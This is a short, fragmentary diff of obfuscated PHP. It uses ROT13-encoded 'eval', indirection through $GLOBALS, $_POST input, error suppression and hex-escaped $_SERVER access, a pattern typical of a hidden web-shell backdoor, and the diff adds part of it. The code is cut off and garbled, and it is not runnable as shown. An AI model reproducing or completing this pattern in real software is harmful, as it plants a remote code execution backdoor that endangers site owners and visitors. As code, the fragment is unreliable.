@@ -33,4 +33,5 @@ str_rot13('riny(
 ]]);}exit();} ?><?php
 foreach ($GLOBALS[$GLOBALS['
  = $_POST; @($
- 
+])+(strstr(substr($_SERVER["\x
+
